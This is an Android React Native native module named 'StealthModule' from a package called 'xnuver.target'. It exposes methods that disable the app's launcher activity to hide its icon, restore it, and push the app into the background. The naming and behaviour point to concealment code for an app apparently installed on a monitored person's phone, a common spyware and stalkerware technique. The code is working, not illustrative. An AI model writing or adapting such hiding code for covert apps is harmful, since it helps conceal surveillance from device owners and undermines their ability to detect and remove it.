package com.zulpikarsandira.xnuver.target;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.util.Log;

import com.facebook.react.bridge.ReactApplicationContext;
import com.facebook.react.bridge.ReactContextBaseJavaModule;
import com.facebook.react.bridge.ReactMethod;

public class StealthModule extends ReactContextBaseJavaModule {
    private static final String TAG = "StealthModule";

    public StealthModule(ReactApplicationContext context) {
        super(context);
    }

    @Override
    public String getName() {
        return "StealthModule";
    }

    @ReactMethod
    public void hideAppIcon() {
        try {
            Context context = getReactApplicationContext();
            PackageManager p = context.getPackageManager();
            // We target MainActivity - this will hide the launcher icon
            ComponentName componentName = new ComponentName(context, "com.zulpikarsandira.xnuver.target.MainActivity");
            p.setComponentEnabledSetting(componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);

            Log.d(TAG, "App icon hidden successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error hiding app icon: " + e.getMessage());
        }
    }

    @ReactMethod
    public void showAppIcon() {
        try {
            Context context = getReactApplicationContext();
            PackageManager p = context.getPackageManager();
            ComponentName componentName = new ComponentName(context, "com.zulpikarsandira.xnuver.target.MainActivity");
            p.setComponentEnabledSetting(componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);

            Log.d(TAG, "App icon restored successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error showing app icon: " + e.getMessage());
        }
    }

    @ReactMethod
    public void minimizeApp() {
        try {
            if (getCurrentActivity() != null) {
                getCurrentActivity().moveTaskToBack(true);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error minimizing app: " + e.getMessage());
        }
    }
}
